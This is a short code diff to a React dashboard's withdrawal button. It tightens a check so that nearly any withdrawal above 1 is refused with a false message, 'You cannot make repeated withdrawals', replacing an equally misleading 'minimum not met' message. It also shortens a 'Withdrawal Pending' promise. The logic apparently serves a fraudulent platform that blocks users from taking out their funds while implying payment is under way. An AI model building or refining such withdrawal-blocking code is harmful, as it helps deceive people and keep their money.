@@ -838,10 +838,10 @@ export default function Dashboard() {
                 {/* ✅ Confirm Button */}
                 <button
                   onClick={async () => {
-                    if (Number(withdrawAmount) > 50) {
+                    if (Number(withdrawAmount) > 1) {
                       // setWithdrawMessage("The minimum withdrawal is $115,000.");
                       setWithdrawMessage(
-                        "The minimum withdrawal has not been met.",
+                        "You cannot make repeated withdrawals.",
                       );
                       setShowWithdrawPopup(true);
                       return;
@@ -882,7 +882,7 @@ export default function Dashboard() {
 
                     // ✅ Keep popup message intact
                     setWithdrawMessage(
-                      `Withdrawal Pending! Will take up to 20 minutes or more depending on the status of recipient\nMethod: ${
+                      `Withdrawal Pending! Will take a few minutes or more depending on the status of recipient\nMethod: ${
                         withdrawType === "wallet"
                           ? selectedWallet
                           : selectedBank === "custom"
